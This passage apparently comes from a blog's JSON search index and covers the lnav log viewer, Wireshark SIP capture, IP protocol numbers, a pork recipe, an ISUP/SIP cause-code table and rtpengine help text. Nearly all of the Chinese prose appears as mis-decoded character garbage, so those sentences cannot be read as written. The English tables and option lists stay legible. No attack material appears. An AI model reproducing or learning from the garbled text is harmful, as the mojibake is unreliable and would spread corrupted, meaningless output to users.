åè®° æœ€è¿‘å› ä¸ºå·¥ä½œéœ€è¦ï¼Œæ¯å¤©éƒ½ä¼šå»æ’æŸ¥å¾ˆå¤šçš„æ—¥å¿—æ–‡ä»¶ã€‚æˆ‘ä¹Ÿæ›¾æƒ³è¿‡è£…ELKä¹‹ç±»çš„å·¥å…·ï¼Œä½†æ˜¯æˆ‘æ”¶åˆ°æ˜¯æ–‡ä»¶ã€‚æ—¥å¿—æ–‡ä»¶è¦è½¬å­˜åˆ°ELKä¸­ä¹Ÿè¦èŠ±åŠŸå¤«ã€‚å¦å¤–ELKä¹Ÿæ˜¯éå¸¸è€—è´¹èµ„æºçš„ã€‚ELKéƒ¨ç½²åˆ°ä¸€åŠæˆ‘å°±æœæ–­æ”¾å¼ƒäº†ã€‚\nä¸å…¶å—è¾•åŒ—è¾™ï¼Œä¸å¦‚å›å½’æœ¬è´¨ã€‚æ‰¾äº›å‘½ä»¤è¡Œçš„å°å·¥å…·ç›´æ¥åˆ†ææ—¥å¿—æ–‡ä»¶ã€‚\n","permalink":"https://wdd.js.org/posts/2020/03/wikbh8/","summary":"lnav, ä¸éœ€è¦æœåŠ¡ç«¯ï¼Œä¸éœ€è¦è®¾ç½®ï¼Œä»ç„¶åŠŸèƒ½å¼ºå¤§åˆ°æ²¡æœ‰æœ‹å‹ã€‚\né€Ÿåº¦ä¸æ€§èƒ½ lnavæ˜¯ä¸€ä¸ªå¯ä»¥è¿è¡Œåœ¨ç»ˆç«¯ä¸Šçš„æ—¥å¿—åˆ†æå·¥å…·ã€‚åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œå¦‚æœgrepå’Œtailç­‰å‘½ä»¤æ— æ³•æ»¡è¶³ä½ çš„éœ€æ±‚ï¼Œæˆ–è®¸ä½ å¯ä»¥å°è¯•ä¸€ä¸‹lnavã€‚\nlnavçš„å®˜æ–¹ä»“åº“æ˜¯https://github.com/tstack/lnavï¼Œåœ¨macä¸Šå¯ä»¥ä½¿ç”¨ brew install lnavÂ å‘½ä»¤å®‰è£…è¿™ä¸ªå‘½ä»¤ã€‚\nåœ¨æˆ‘çš„4C8Gçš„Macbook Proä¸Šï¼Œæ‰“å¼€ä¸€ä¸ª2.8Gçš„æ—¥å¿—æ–‡ä»¶åˆ°æ¸²æŸ“å‡ºç°ï¼Œéœ€è¦èŠ±è´¹çº¦40sï¼Œå¹³å‡æ¯ç§’è½½å…¥è¶…è¿‡70MBã€‚è½½å…¥æ—¥å¿—å’Œæ¸²æŸ“æ—¶ï¼Œä½¿ç”¨äº†æ¥è¿‘100%çš„CPUã€‚æ¸²æŸ“å®Œæ¯•ï¼Œä½¿ç”¨1.2Gçš„å†…å­˜ç©ºé—´ã€‚\næ€»ä¹‹å‘¢ï¼Œè¿™ä¸ªå·¥å…·è½½å…¥æ—¥å¿—çš„é€Ÿåº¦å¾ˆå¿«ã€‚ä½†æ˜¯æœ€å¥½ä¸è¦å†ç”Ÿäº§ç¯å¢ƒä¸Šä½¿ç”¨è¿™ä¸ªå‘½ä»¤è½½å…¥è¿‡å¤§çš„æ—¥å¿—æ–‡ä»¶ï¼Œå¦åˆ™å¯èƒ½é€ æˆç³»ç»Ÿèµ„æºæ¶ˆè€—å¤ªå¤§çš„é—®é¢˜ã€‚\nåœ¨è½½å…¥2.8Gçš„æ—¥å¿—æ–‡ä»¶å(3200å¤šä¸‡è¡Œ)ï¼Œè¿‡æ»¤æ—¶æ˜¾å¾—éå¸¸å¡é¡¿ï¼Œä½†æ˜¯æŸ¥çœ‹æ—¥å¿—å¹¶ä¸å¡é¡¿ã€‚\nåœ¨lnavçš„æœç´¢å…³é”®å­—ï¼Œä¸‹æ¬¡æ‰“å¼€å…¶ä»–æ—¥å¿—æ—¶ï¼Œlnavä¼šè‡ªåŠ¨æœç´¢è¿™ä¸ªå…³é”®è¯ã€‚è¿™æ˜¯å®ƒçš„Sessionè®°å½•åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨Ctrl+Ré‡ç½®Sessionã€‚\nlnavçš„ç‰¹ç‚¹\nè¯­æ³•é«˜äº® å„ç§è¿‡æ»¤æ¡ä»¶ å¤šå…³é”®è¯è¿‡æ»¤ å„ç§å¿«æ·è·³è½¬ è‡ªå¸¦ç»Ÿè®¡å’Œå¯è§†åŒ–åŠŸèƒ½ï¼Œæ¯”å¦‚ä½¿ç”¨æ¡å½¢å›¾å±•ç¤ºå•ä½æ—¶é—´å†…çš„æŠ¥é”™å’Œæ—¥å¿—æ•°é‡ è‡ªåŠ¨æ—¥å¿—æ ¼å¼æ£€æŸ¥ã€‚æ”¯æŒå¾ˆå¤šç§æ—¥å¿—æ ¼å¼ èƒ½å¤ŸæŒ‰ç…§æ—¶é—´å»è¿‡æ»¤æ—¥å¿— TABè‡ªåŠ¨è¡¥å…¨ å®æ—¶æ“ä½œ æ”¯æŒSQLè¯­æ³•æŸ¥æ—¥å¿— æ”¯æŒæ–‡ä»¶å¯¼å‡ºæˆå…¶ä»–æ ¼å¼ æ”¯æŒç›´æ¥æ‰“å¼€tar.gzç­‰å‹ç¼©åçš„æ—¥å¿—æ–‡ä»¶ æ”¯æŒå¾ˆå¤šå¿«æ·é”® xä¸‹é¢æ˜¯æŒ‰å¤©çš„æ—¥å¿—ç»Ÿè®¡ï¼Œç°è‰²æ˜¯æ™®é€šæ—¥å¿—ï¼Œé»„è‰²æ˜¯å‘Šè­¦æ—¥å¿—ï¼Œçº¢è‰²çš„é”™è¯¯æ—¥å¿—ã€‚ä¸‰ç§é¢œè‰²å åŠ çš„é•¿åº¦å°±æ˜¯æ€»æ—¥å¿—ã€‚æ—¶é—´è·¨åº¦å•ä½ä¹Ÿæ˜¯å¯ä»¥è°ƒèŠ‚çš„ã€‚æœ€å¤§è·¨åº¦æ˜¯ä¸€å¤©ï¼Œæœ€çŸ­è·¨åº¦æ˜¯1ç§’ã€‚\nä»ç„¶æ˜¯æ—¥å¿—æ ¼å¼ è‡ªåŠ¨æ—¥å¿—æ ¼å¼æ£€æµ‹ ç³»ç»Ÿæ—¥å¿— WebæœåŠ¡å™¨è®¿é—®æ—¥å¿— æŠ¥é”™æ—¥å¿— ç­‰ç­‰ è¿‡æ»¤ å¯ä»¥è®¾ç½®å¤šä¸ªè¿‡æ»¤è§„åˆ™ æ—¶é—´çº¿è¿‡æ»¤ ç²¾ç¡®æ—¶é—´çš„æ—¥å¿— ä¸Šä¸ªå°æ—¶ï¼Œä¸‹ä¸ªå°æ—¶ ä¸Šä¸€åˆ†é’Ÿï¼Œä¸‹ä¸€åˆ†é’Ÿ èƒ½å¤ŸæŒ‰ç…§æ—¶é—´å»è¿½è¸ªæ—¥å¿—\næŒ‰ç…§æ—¶é—´å‘¨æœŸç»Ÿè®¡ ç»Ÿè®¡æ¯ç§’å‡ºç°çš„é”™è¯¯ï¼Œå‘Šè­¦å’Œæ€»æ—¥å¿—çš„é‡ è¯­æ³•é«˜äº® Tabé”®è‡ªåŠ¨è¡¥å…¨ å‚è€ƒ https://lnav.readthedocs.io/en/latest/ å¦‚æœä½ æ›´å–œæ¬¢GUIå·¥å…·ï¼Œé‚£ä¹Ÿå¯ä»¥è¯•è¯•https://github.com/nickbnf/glogg åè®° æœ€è¿‘å› ä¸ºå·¥ä½œéœ€è¦ï¼Œæ¯å¤©éƒ½ä¼šå»æ’æŸ¥å¾ˆå¤šçš„æ—¥å¿—æ–‡ä»¶ã€‚æˆ‘ä¹Ÿæ›¾æƒ³è¿‡è£…ELKä¹‹ç±»çš„å·¥å…·ï¼Œä½†æ˜¯æˆ‘æ”¶åˆ°æ˜¯æ–‡ä»¶ã€‚æ—¥å¿—æ–‡ä»¶è¦è½¬å­˜åˆ°ELKä¸­ä¹Ÿè¦èŠ±åŠŸå¤«ã€‚å¦å¤–ELKä¹Ÿæ˜¯éå¸¸è€—è´¹èµ„æºçš„ã€‚ELKéƒ¨ç½²åˆ°ä¸€åŠæˆ‘å°±æœæ–­æ”¾å¼ƒäº†ã€‚\nä¸å…¶å—è¾•åŒ—è¾™ï¼Œä¸å¦‚å›å½’æœ¬è´¨ã€‚æ‰¾äº›å‘½ä»¤è¡Œçš„å°å·¥å…·ç›´æ¥åˆ†ææ—¥å¿—æ–‡ä»¶ã€‚","title":"å‘½ä»¤è¡Œæ—¥å¿—æŸ¥çœ‹ç¥å™¨ï¼šlnav"},{"content":"å›¾è§£åŒ…åœ¨TCP/IPå„ä¸ªåè®®æ ˆçš„æµåŠ¨æƒ…å†µ\nç‚¹å‡»æŸ¥çœ‹ã€undefinedã€‘\n","permalink":"https://wdd.js.org/network/mlepcg/","summary":"å›¾è§£åŒ…åœ¨TCP/IPå„ä¸ªåè®®æ ˆçš„æµåŠ¨æƒ…å†µ\nç‚¹å‡»æŸ¥çœ‹ã€undefinedã€‘","title":"ç½‘ç»œåŒ…çš„å°è£…å’Œåˆ†ç”¨"},{"content":"1. æ‰“å¼€wiresharkï¼Œå¹¶é€‰æ‹©ç½‘å¡ åœ¨è¿‡æ»¤æ¡ä»¶ä¸­è¾“å…¥sip 2. é€‰æ‹©ç”µè¯-\u0026gt; VoIP Calls 3. é€‰ä¸­ä¸€æ¡å‘¼å«è®°å½•-\u0026gt;ç„¶åç‚¹å‡» Flow Sequence 4. æŸ¥çœ‹æ¶ˆæ¯çš„è¯¦æƒ… ","permalink":"https://wdd.js.org/opensips/tools/wireshark-sip/","summary":"1. æ‰“å¼€wiresharkï¼Œå¹¶é€‰æ‹©ç½‘å¡ åœ¨è¿‡æ»¤æ¡ä»¶ä¸­è¾“å…¥sip 2. é€‰æ‹©ç”µè¯-\u0026gt; VoIP Calls 3. é€‰ä¸­ä¸€æ¡å‘¼å«è®°å½•-\u0026gt;ç„¶åç‚¹å‡» Flow Sequence 4. æŸ¥çœ‹æ¶ˆæ¯çš„è¯¦æƒ… ","title":"Wireshark SIP æŠ“åŒ…"},{"content":"IPåè®®æ ¼å¼ å­—æ®µè¯´æ˜Â Protocol è¡¨ç¤ºä¸Šå±‚åè®®ï¼Œä¹Ÿå°±æ˜¯ä¼ è¾“å±‚æ˜¯ä»€ä¹ˆåè®®ã€‚\nåªéœ€è¦çœ‹Decimalè¿™åˆ—ï¼Œå¸¸ç”¨çš„æœ‰6è¡¨ç¤ºTCP, 17è¡¨ç¤ºUDP, 50è¡¨ç¤ºESPã€‚\nç”¨wiresharkæŠ“åŒ…çš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°Protocol: UDP(17)\nå‚è€ƒ https://tools.ietf.org/html/rfc791 https://tools.ietf.org/html/rfc790 https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers ","permalink":"https://wdd.js.org/network/ip-protocol/","summary":"IPåè®®æ ¼å¼ å­—æ®µè¯´æ˜Â Protocol è¡¨ç¤ºä¸Šå±‚åè®®ï¼Œä¹Ÿå°±æ˜¯ä¼ è¾“å±‚æ˜¯ä»€ä¹ˆåè®®ã€‚\nåªéœ€è¦çœ‹Decimalè¿™åˆ—ï¼Œå¸¸ç”¨çš„æœ‰6è¡¨ç¤ºTCP, 17è¡¨ç¤ºUDP, 50è¡¨ç¤ºESPã€‚\nç”¨wiresharkæŠ“åŒ…çš„æ—¶å€™ï¼Œä¹Ÿå¯ä»¥çœ‹åˆ°Protocol: UDP(17)\nå‚è€ƒ https://tools.ietf.org/html/rfc791 https://tools.ietf.org/html/rfc790 https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers ","title":"IPåè®® Protocol"},{"content":" ","permalink":"https://wdd.js.org/network/ibhy8a/","summary":" ","title":"ä»é£æœºèˆªçº¿è®²è§£ç½‘ç»œåˆ†å±‚"},{"content":"ç½‘é¡µä¸Šçš„æŠ¥é”™ï¼Œä¸€èˆ¬éƒ½ä¼šå’ŒHTTPè¯·æ±‚å‡ºé”™æœ‰å…³ã€‚ åœ¨Chromeæµè§ˆå™¨ä¸­ï¼ŒæŒ‰F12æˆ–è€…command+option+iå¯ä»¥æ‰“å¼€Dev toolsï¼Œåœ¨ç½‘ç»œé¢æ¿ä¸­å¯ä»¥æ‰¾åˆ°æŠ¥é”™çš„çš„HTTPè¯·æ±‚ã€‚\né€šè¿‡æäº¤Copy as cURL å’Œ Copy responseçš„å†…å®¹ï¼Œå°±ä¼šéå¸¸å‡†ç¡®çš„æŠŠé—®é¢˜æŠ¥å‘Šç»™å¼€å‘ã€‚å¼€å‘ä¹Ÿä¼šéå¸¸å¿«é€Ÿçš„å®šä½é—®é¢˜ã€‚\n","permalink":"https://wdd.js.org/fe/copy-as-curl-and-copy-response/","summary":"ç½‘é¡µä¸Šçš„æŠ¥é”™ï¼Œä¸€èˆ¬éƒ½ä¼šå’ŒHTTPè¯·æ±‚å‡ºé”™æœ‰å…³ã€‚ åœ¨Chromeæµè§ˆå™¨ä¸­ï¼ŒæŒ‰F12æˆ–è€…command+option+iå¯ä»¥æ‰“å¼€Dev toolsï¼Œåœ¨ç½‘ç»œé¢æ¿ä¸­å¯ä»¥æ‰¾åˆ°æŠ¥é”™çš„çš„HTTPè¯·æ±‚ã€‚\né€šè¿‡æäº¤Copy as cURL å’Œ Copy responseçš„å†…å®¹ï¼Œå°±ä¼šéå¸¸å‡†ç¡®çš„æŠŠé—®é¢˜æŠ¥å‘Šç»™å¼€å‘ã€‚å¼€å‘ä¹Ÿä¼šéå¸¸å¿«é€Ÿçš„å®šä½é—®é¢˜ã€‚","title":"Copy as CURL and Copy Response"},{"content":"1. é€‰è‚‰ **çŒªè‚‰ï¼Œè‚¥ç˜¦ç›¸é—´çš„äº”èŠ±è‚‰æ‰æœ€å¥½åƒã€‚**ç²¾ç˜¦è‚‰åƒèµ·æ¥ä¼šå¤ªæŸ´ï¼Œå¤ªè‚¥çš„è‚‰ä¼šæ˜¾å¾—å¤ªè…»ã€‚äº”èŠ±è‚‰åˆ™åˆšåˆšå¥½ï¼Œä¸æŸ´ä¹Ÿä¸è…»ã€‚\n2. ç‚’å¹² çƒ§å¥½çš„çŒªè‚‰ä¸­å¦‚æœæœ‰ç”Ÿæ°´çš„å‘³é“ï¼Œåˆ™å£æ„Ÿä¸å¥½ï¼Œè€Œä¸”ä¼šæ˜¾å¾—è‚‰ä¸å¤Ÿç†Ÿã€‚\n3. å…·ä½“æ­¥éª¤ äº”èŠ±è‚‰æ´—å‡€ï¼Œåˆ‡ç‰‡ã€‚æ”¾å…¥å¹²å‡€çš„ç‚’é”…ä¸­ï¼Œç„¶åå¼€ç«çƒ§ å°†äº”èŠ±è‚‰çš„æ°´åˆ†çƒ§å¹²ï¼Œå¹¶ä¸”å†’æ²¹ï¼Œè‚‰é¢å‘é»„ æ”¾å…¥å§œè‘±è’œï¼Œå°ç±³æ¤’ï¼ŒåŠ å…¥ç”ŸæŠ½ï¼Œæ–™é…’ï¼Œé£Ÿç›çˆ†ç‚’ã€‚å¦‚æœçŒªæ²¹æ¯”è¾ƒå°‘ï¼Œåˆ™å¯ä»¥æ”¾å…¥é€‚é‡é£Ÿç”¨æ²¹ ç„¶åå¯ä»¥æŒ‰éœ€åŠ å…¥è”¬èœã€‚ä¾‹å¦‚èŠ±èœã€æˆ–è€…èŠ¹èœã€æˆ–è€…å°é’æ¤’ ç‚’åˆ°è”¬èœ9æˆç†Ÿï¼Œç„¶åå‡ºé”… ","permalink":"https://wdd.js.org/posts/2020/02/edtzzx/","summary":"1. é€‰è‚‰ **çŒªè‚‰ï¼Œè‚¥ç˜¦ç›¸é—´çš„äº”èŠ±è‚‰æ‰æœ€å¥½åƒã€‚**ç²¾ç˜¦è‚‰åƒèµ·æ¥ä¼šå¤ªæŸ´ï¼Œå¤ªè‚¥çš„è‚‰ä¼šæ˜¾å¾—å¤ªè…»ã€‚äº”èŠ±è‚‰åˆ™åˆšåˆšå¥½ï¼Œä¸æŸ´ä¹Ÿä¸è…»ã€‚\n2. ç‚’å¹² çƒ§å¥½çš„çŒªè‚‰ä¸­å¦‚æœæœ‰ç”Ÿæ°´çš„å‘³é“ï¼Œåˆ™å£æ„Ÿä¸å¥½ï¼Œè€Œä¸”ä¼šæ˜¾å¾—è‚‰ä¸å¤Ÿç†Ÿã€‚\n3. å…·ä½“æ­¥éª¤ äº”èŠ±è‚‰æ´—å‡€ï¼Œåˆ‡ç‰‡ã€‚æ”¾å…¥å¹²å‡€çš„ç‚’é”…ä¸­ï¼Œç„¶åå¼€ç«çƒ§ å°†äº”èŠ±è‚‰çš„æ°´åˆ†çƒ§å¹²ï¼Œå¹¶ä¸”å†’æ²¹ï¼Œè‚‰é¢å‘é»„ æ”¾å…¥å§œè‘±è’œï¼Œå°ç±³æ¤’ï¼ŒåŠ å…¥ç”ŸæŠ½ï¼Œæ–™é…’ï¼Œé£Ÿç›çˆ†ç‚’ã€‚å¦‚æœçŒªæ²¹æ¯”è¾ƒå°‘ï¼Œåˆ™å¯ä»¥æ”¾å…¥é€‚é‡é£Ÿç”¨æ²¹ ç„¶åå¯ä»¥æŒ‰éœ€åŠ å…¥è”¬èœã€‚ä¾‹å¦‚èŠ±èœã€æˆ–è€…èŠ¹èœã€æˆ–è€…å°é’æ¤’ ç‚’åˆ°è”¬èœ9æˆç†Ÿï¼Œç„¶åå‡ºé”… ","title":"å¦‚ä½•çƒ§è‚‰æ‰å¥½åƒ"},{"content":"ISUP to SIP ISUP Cause Value SIP Response Normal event 1 â€“ unallocated number 404 Not Found 2 â€“ no route to network 404 Not Found 3 â€“ no route to destination 404 Not Found 16 â€“ normal call clearing \u0026mdash; (*) 17 â€“ user busy 486 Busy here 18 â€“ no user responding 408 Request Timeout 19 â€“ no answer from the user 480 Temporarily unavailable 20 â€“ subscriber absent 480 Temporarily unavailable 21 â€“ call rejected 403 Forbidden (+) 22 â€“ number changed (s/o diagnostic) 410 Gone 23 â€“ redirection to new destination 410 Gone 26 â€“ non-selected user clearing 404 Not Found (=) 27 â€“ destination out of order 502 Bad Gateway 28 â€“ address incomplete 484 Address incomplete 29 â€“ facility rejected 510 Not implemented 31 â€“ normal unspecified 480 Temporarily unavailable Resource unavailable 34 â€“ no circuit available 503 Service unavailable 38 â€“ network out of order 503 Service unavailable 41 â€“ temporary failure 503 Service unavailable 42 â€“ switching equipment congestion 503 Service unavailable 47 â€“ resource unavailable 503 Service unavailable Service or option not available 55 â€“ incoming calls barred within CUG 403 Forbidden 57 â€“ bearer capability not authorized 403 Forbidden 58 â€“ bearer capability not presently available 503 Service unavailable 65 â€“ bearer capability not implemented 488 Not Acceptable here 70 â€“ Only restricted digital information bearer capability is available (National use) 488 Not Acceptable here 79 â€“ service or option not implemented 501 Not implemented Invalid message 87 â€“ user not member of CUG 403 Forbidden 88 â€“ incompatible destination 503 Service unavailable 102 â€“ Call Setup Time-out Failure 504 Gateway timeout 111 â€“ Protocol Error Unspecified 500 Server internal error Interworking 127 â€“ Internal Error - interworking unspecified 500 Server internal error (*) ISDN Cause 16 will usually result in a BYE or CANCEL(+) If the cause location is user then the 6xx code could be given rather than the 4xx code. the cause value received in the H.225.0 message is unknown in ISUP, the unspecified cause value of the class is sent.(=) ANSI procedureÂ SIP to ISDN Response received Cause value in the REL.\nSIP Status Code ISDN Map 400 - Bad Request 41 â€“ Temporary failure 401 - Unauthorized 21 â€“ Call rejected (*) 402 - Payment required 21 â€“ Call rejected 403 - Forbidden 21 â€“ Call rejected 404 - Not Found 1 â€“ Unallocated number 405 - Method not allowed 63 â€“ Service or option unavailable 406 - Not acceptable 79 â€“ Service/option not implemented (+) 407 - Proxy authentication required 21 â€“ Call rejected (*) 408 - Request timeout 102 â€“ Recovery on timer expiry 410 - Gone 22 â€“ Number changed (w/o diagnostic) 413 - Request Entity too long 127 â€“ Interworking (+) 414 - Request â€“URI too long 127 â€“ Interworking (+) 415 - Unsupported media type 79 â€“ Service/option not implemented (+) 416 - Unsupported URI Scheme 127 â€“ Interworking (+) 402 - Bad extension 127 â€“ Interworking (+) 421 - Extension Required 127 â€“ Interworking (+) 423 - Interval Too Brief 127 â€“ Interworking (+) 480 - Temporarily unavailable 18 â€“ No user responding 481 - Call/Transaction Does not Exist 41 â€“ Temporary Failure 482 - Loop Detected 25 â€“ Exchange â€“ routing error 483 - Too many hops 25 â€“ Exchange â€“ routing error 484 - Address incomplete 28 â€“ Invalid Number Format (+) 485 - Ambiguous 1 â€“ Unallocated number 486 - Busy here 17 â€“ User Busy 487 - Request Terminated \u0026mdash; (no mapping) 488 - Not Acceptable here \u0026mdash; by warning header 500 - Server internal error 41 â€“ Temporary Failure 501 - Not implemented 79 â€“ Not implemented, unspecified 502 - Bad gateway 38 â€“ Network out of order 503 - Service unavailable 41 â€“ Temporary Failure 504 - Service time-out 102 â€“ Recovery on timer expiry 505 - Version Not supported 127 â€“ Interworking (+) 513 - Message Too Large 127 â€“ Interworking (+) 600 - Busy everywhere 17 â€“ User busy 603 - Decline 21 â€“ Call rejected 604 - Does not exist anywhere 1 â€“ Unallocated number 606 - Not acceptable \u0026mdash; by warning header å‚è€ƒ https://www.dialogic.com/webhelp/BorderNet2020/1.1.0/WebHelp/cause_code_map_ss7_sip.htm ","permalink":"https://wdd.js.org/opensips/ch9/isup-sip-isdn/","summary":"ISUP to SIP ISUP Cause Value SIP Response Normal event 1 â€“ unallocated number 404 Not Found 2 â€“ no route to network 404 Not Found 3 â€“ no route to destination 404 Not Found 16 â€“ normal call clearing \u0026mdash; (*) 17 â€“ user busy 486 Busy here 18 â€“ no user responding 408 Request Timeout 19 â€“ no answer from the user 480 Temporarily unavailable 20 â€“ subscriber absent 480 Temporarily unavailable 21 â€“ call rejected 403 Forbidden (+) 22 â€“ number changed (s/o diagnostic) 410 Gone 23 â€“ redirection to new destination 410 Gone 26 â€“ non-selected user clearing 404 Not Found (=) 27 â€“ destination out of order 502 Bad Gateway 28 â€“ address incomplete 484 Address incomplete 29 â€“ facility rejected 510 Not implemented 31 â€“ normal unspecified 480 Temporarily unavailable Resource unavailable 34 â€“ no circuit available 503 Service unavailable 38 â€“ network out of order 503 Service unavailable 41 â€“ temporary failure 503 Service unavailable 42 â€“ switching equipment congestion 503 Service unavailable 47 â€“ resource unavailable 503 Service unavailable Service or option not available 55 â€“ incoming calls barred within CUG 403 Forbidden 57 â€“ bearer capability not authorized 403 Forbidden 58 â€“ bearer capability not presently available 503 Service unavailable 65 â€“ bearer capability not implemented 488 Not Acceptable here 70 â€“ Only restricted digital information bearer capability is available (National use) 488 Not Acceptable here 79 â€“ service or option not implemented 501 Not implemented Invalid message 87 â€“ user not member of CUG 403 Forbidden 88 â€“ incompatible destination 503 Service unavailable 102 â€“ Call Setup Time-out Failure 504 Gateway timeout 111 â€“ Protocol Error Unspecified 500 Server internal error Interworking 127 â€“ Internal Error - interworking unspecified 500 Server internal error (*) ISDN Cause 16 will usually result in a BYE or CANCEL(+) If the cause location is user then the 6xx code could be given rather than the 4xx code.","title":"ISUP SIP ISDNå¯¹ç…§ç è¡¨"},{"content":"å¸®åŠ©æ–‡æ¡£ Usage: rtpengine [OPTION...] - next-generation media proxy Application Options: -v, \u0026ndash;version Print build time and exit \u0026ndash;config-file=FILE Load config from this file \u0026ndash;config-section=STRING Config file section to use \u0026ndash;log-facility=daemon|local0|\u0026hellip;|local7 Syslog facility to use for logging **-L, \u0026ndash;log-level=INT ** Mask log priorities above this level å–å€¼ä»0-7ï¼Œ 7 debug 6 info 5 notice **-E, \u0026ndash;log-stderr ** Log on stderr instead of syslog \u0026ndash;no-log-timestamps Drop timestamps from log lines to stderr \u0026ndash;log-mark-prefix Prefix for sensitive log info \u0026ndash;log-mark-suffix Suffix for sensitive log info **-p, \u0026ndash;pidfile=FILE **Â Write PID to file **-f, \u0026ndash;foreground **Â Don\u0026rsquo;t fork to background -t, \u0026ndash;table=INT Kernel table to use -F, \u0026ndash;no-fallback Only start when kernel module is available **-i, \u0026ndash;interface=[NAME/]IP[!IP] **Â Local interface for RTP -k, \u0026ndash;subscribe-keyspace=INT INT \u0026hellip; Subscription keyspace list -l, \u0026ndash;listen-tcp=[IP:]PORT TCP port to listen on -u, \u0026ndash;listen-udp=[IP46|HOSTNAME:]PORT UDP port to listen on -n, \u0026ndash;listen-ng=[IP46|HOSTNAME:]PORT UDP port to listen on, NG protocol **-c, \u0026ndash;listen-cli=[IP46|HOSTNAME:]PORT **Â UDP port to listen on, CLI -g, \u0026ndash;graphite=IP46|HOSTNAME:PORT Address of the graphite server -G, \u0026ndash;graphite-interval=INT Graphite send interval in seconds \u0026ndash;graphite-prefix=STRING Prefix for graphite line -T, \u0026ndash;tos=INT Default TOS value to set on streams \u0026ndash;control-tos=INT Default TOS value to set on control-ng -o, \u0026ndash;timeout=SECS RTP timeout -s, \u0026ndash;silent-timeout=SECS RTP timeout for muted -a, \u0026ndash;final-timeout=SECS Call timeout \u0026ndash;offer-timeout=SECS Timeout for incomplete one-sided calls **-m, \u0026ndash;port-min=INT ** Lowest port to use for RTP **-M, \u0026ndash;port-max=INT ** Highest port to use for RTP -r, \u0026ndash;redis=[PW@]IP:PORT/INT Connect to Redis database -w, \u0026ndash;redis-write=[PW@]IP:PORT/INT Connect to Redis write database \u0026ndash;redis-num-threads=INT Number of Redis restore threads \u0026ndash;redis-expires=INT Expire time in seconds for redis keys -q, \u0026ndash;no-redis-required Start no matter of redis connection state \u0026ndash;redis-allowed-errors=INT Number of allowed errors before redis is temporarily disabled \u0026ndash;redis-disable-time=INT Number of seconds redis communication is disabled because of errors \u0026ndash;redis-cmd-timeout=INT Sets a timeout in milliseconds for redis commands \u0026ndash;redis-connect-timeout=INT Sets a timeout in milliseconds for redis connections -b, \u0026ndash;b2b-url=STRING XMLRPC URL of B2B UA \u0026ndash;log-facility-cdr=daemon|local0|\u0026hellip;|local7 Syslog facility to use for logging CDRs \u0026ndash;log-facility-rtcp=daemon|local0|\u0026hellip;|local7 Syslog facility to use for logging RTCP \u0026ndash;log-facility-dtmf=daemon|local0|\u0026hellip;|local7 Syslog facility to use for logging DTMF \u0026ndash;log-format=default|parsable Log prefix format \u0026ndash;dtmf-log-dest=IP46|HOSTNAME:PORT Destination address for DTMF logging via UDP -x, \u0026ndash;xmlrpc-format=INT XMLRPC timeout request format to use. 0: SEMS DI, 1: call-id only, 2: Kamailio \u0026ndash;num-threads=INT Number of worker threads to create \u0026ndash;media-num-threads=INT Number of worker threads for media playback -d, \u0026ndash;delete-delay=INT Delay for deleting a session from memory. \u0026ndash;sip-source Use SIP source address by default \u0026ndash;dtls-passive Always prefer DTLS passive role \u0026ndash;max-sessions=INT Limit of maximum number of sessions \u0026ndash;max-load=FLOAT Reject new sessions if load averages exceeds this value \u0026ndash;max-cpu=FLOAT Reject new sessions if CPU usage (in percent) exceeds this value \u0026ndash;max-bandwidth=INT Reject new sessions if bandwidth usage (in bytes per second) exceeds this value \u0026ndash;homer=IP46|HOSTNAME:PORT Address of Homer server for RTCP stats \u0026ndash;homer-protocol=udp|tcp Transport protocol for Homer (default udp) \u0026ndash;homer-id=INT \u0026lsquo;Capture ID\u0026rsquo; to use within the HEP protocol \u0026ndash;recording-dir=FILE Directory for storing pcap and metadata files \u0026ndash;recording-method=pcap|proc Strategy for call recording \u0026ndash;recording-format=raw|eth File format for stored pcap files \u0026ndash;iptables-chain=STRING Add explicit firewall rules to this iptables chain \u0026ndash;codecs Print a list of supported codecs and exit \u0026ndash;scheduling=default|none|fifo|rr|other|batch|idle Thread scheduling policy \u0026ndash;priority=INT Thread scheduling priority \u0026ndash;idle-scheduling=default|none|fifo|rr|other|batch|idle Idle thread scheduling policy \u0026ndash;idle-priority=INT Idle thread scheduling priority \u0026ndash;log-srtp-keys Log SRTP keys to error log \u0026ndash;mysql-host=HOST|IP MySQL host for stored media files \u0026ndash;mysql-port=INT MySQL port \u0026ndash;mysql-user=USERNAME MySQL connection credentials \u0026ndash;mysql-pass=PASSWORD MySQL connection credentials \u0026ndash;mysql-query=STRING MySQL select query \u0026ndash;endpoint-learning=delayed|immediate|off|heuristic RTP endpoint learning algorithm \u0026ndash;jitter-buffer=INT Size of jitter buffer \u0026ndash;jb-clock-drift Compensate for source clock drift å‚è€ƒ https://github.com/sipwise/rtpengine ","permalink":"https://wdd.js.org/opensips/ch9/rtpengine-manu/","summary":"å¸®åŠ©æ–‡æ¡£ Usage: rtpengine [OPTION...] - next-generation media proxy Application Options: -v, \u0026ndash;version Print build time and exit \u0026ndash;config-file=FILE Load config from this file \u0026ndash;config-section=STRING Config file section to use \u0026ndash;log-facility=daemon|local0|\u0026hellip;|local7 Syslog facility to use for logging **-L, \u0026ndash;log-level=INT ** Mask log priorities above this level å–å€¼ä»0-7ï¼Œ 7 debug 6 info 5 notice **-E, \u0026ndash;log-stderr ** Log on stderr instead of syslog \u0026ndash;no-log-timestamps Drop timestamps from log lines to stderr \u0026ndash;log-mark-prefix Prefix for sensitive log info \u0026ndash;log-mark-suffix Suffix for sensitive log info **-p, \u0026ndash;pidfile=FILE **Â Write PID to file **-f, \u0026ndash;foreground **Â Don\u0026rsquo;t fork to background -t, \u0026ndash;table=INT Kernel table to use -F, \u0026ndash;no-fallback Only start when kernel module is available **-i, \u0026ndash;interface=[NAME/]IP[!","title":"rtpengine"},{"content":"ACKçš„ç‰¹ç‚¹ ACKä»…ç”¨äºå¯¹INVITEæ¶ˆæ¯çš„æœ€ç»ˆå“åº”è¿›è¡Œç¡®è®¤ ACKçš„CSeqçš„å·ç å¿…é¡»å’ŒINVITEçš„CSeqå·ç ç›¸åŒï¼Œè¿™æ˜¯ç”¨æ¥ä¿è¯ACKå¯¹å¯¹å“ªä¸€ä¸ªINVITEè¿›è¡Œç¡®è®¤çš„å”¯ä¸€æ ‡å¿—ã€‚å¦å¤–CSeqçš„æ–¹æ³•ä¼šæ”¹ä¸ºACK 